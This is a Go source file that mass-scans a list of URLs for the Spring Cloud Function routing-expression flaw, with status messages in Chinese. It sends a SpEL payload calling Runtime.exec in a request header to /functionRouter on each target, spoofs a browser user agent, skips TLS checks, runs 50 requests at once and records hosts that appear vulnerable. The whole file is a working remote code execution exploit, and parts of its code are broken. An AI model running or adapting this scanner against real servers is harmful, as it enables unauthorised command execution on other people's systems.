package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"github.com/go-resty/resty/v2"
	"io"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var sucList []string
var sucNum = 0

func ReadFile(name string) []string {
	var urlList []string
	f, err := os.OpenFile(name, os.O_RDONLY, 0600)
	if err != nil {
		fmt.Println("read file error: ", err)
		panic(err)
	}
	defer f.Close()
	br := bufio.NewReader(f)
	for {
		a, _, c := br.ReadLine()
		if c == io.EOF {
			break
		}
		urlList = append(urlList, string(a))
	}
	return urlList
}

func Scan(url, cmd string, ch chan int, wg *sync.WaitGroup) {
	defer wg.Done()
	payloadSlice := []string{"T(java.lang.Runtime).getRuntime().exec(\"", cmd, "\""}
	payload := strings.Join(payloadSlice, "")
	urlSlice := []string{url, "/functionRouter"}
	u := strings.Join(urlSlice, "")
	client := resty.New()
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetTimeout(5 * time.Second)
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.52",
			"Content-Type": "application/x-www-form-urlencoded",
			"spring.cloud.function.routing-expression": payload,
		}).
		SetBody("test").
		Post(u)
	n := <-ch
	var builder strings.Builder
	if err != nil {
		builder.WriteString("[")
		builder.WriteString(time.Unix(time.Now().Unix(), 0).Format("15:04:05"))
		builder.WriteString("]")
		builder.WriteString("[")
		builder.WriteString(strconv.Itoa(n))
		builder.WriteString("]")
		builder.WriteString("[")
		builder.WriteString(strconv.Itoa(sucNum))
		builder.WriteString("]")
		builder.WriteString("[-]\t")
		builder.WriteString(url)
		if strings.Contains(err.Error(), "Client.Timeout") {
			builder.WriteString("\t连接超时")
		} else if strings.Contains(err.Error(), "HTTP response to HTTPS client") {
			strings.Replace(url, "s", "", 1)
			go Scan(url, cmd, ch, wg)
		} else if strings.Contains(err.Error(), "connection re") {
			builder.WriteString("\t连接被拒")
		} else if strings.Contains(err.Error(), "connection re") {
			builder.WriteString("\t域名失效")
		} else {
			builder.WriteString("\t扫描失败")
			builder.WriteString(err.Error())
		}
		fmt.Println(builder.String())
		builder.Reset()
		return
	}
	if resp.StatusCode() == 500 && strings.Contains(resp.String(), "Internal Server Error") {
		sucNum += 1
		builder.WriteString("[")
		builder.WriteString(time.Unix(time.Now().Unix(), 0).Format("15:04:05"))
		builder.WriteString("]")
		builder.WriteString("[")
		builder.WriteString(strconv.Itoa(n))
		builder.WriteString("]")
		builder.WriteString("[")
		builder.WriteString(strconv.Itoa(sucNum))
		builder.WriteString("]")
		builder.WriteString("[+]\t")
		builder.WriteString(url)
		builder.WriteString("\t存在漏洞")
		fmt.Println(builder.String())
		builder.Reset()
		Write("suc.txt", url)
		//sucList = append(sucList, url)
	} else {
		builder.WriteString("[")
		builder.WriteString(time.Unix(time.Now().Unix(), 0).Format("15:04:05"))
		builder.WriteString("]")
		builder.WriteString("[")
		builder.WriteString(strconv.Itoa(n))
		builder.WriteString("]")
		builder.WriteString("[")
		builder.WriteString(strconv.Itoa(sucNum))
		builder.WriteString("]")
		builder.WriteString("[-]\t")
		builder.WriteString(url)
		builder.WriteString("\t不存在漏洞")
		fmt.Println(builder.String())
		builder.Reset()
	}
}

func WriteFile(filename string) {
	var builder strings.Builder
	f, _ := os.OpenFile(filename, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0666)
	defer f.Close()
	for i := 0; i < len(sucList); i++ {
		builder.WriteString(sucList[i])
		builder.WriteString("\n")
		s := builder.String()
		builder.Reset()
		_, err := f.WriteString(s)
		if err != nil {
			fmt.Println("write error: ", err)
			return
		}
	}
}

func Write(filename, str string) {
	f, _ := os.OpenFile(filename, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0666)
	defer f.Close()
	_, err := f.WriteString(str + "\n")
	if err != nil {
		fmt.Println("write error: ", err)
		return
	}
}

func main() {
	urlList := ReadFile("url.txt")
	var wg sync.WaitGroup
	maxGoroutine := 50
	ch := make(chan int, maxGoroutine)
	for i := 0; i < len(urlList); i++ {
		ch <- i
		wg.Add(1)
		go Scan(urlList[i], "pwd", ch, &wg)
	}
	wg.Wait()
	WriteFile("suc.txt")
}
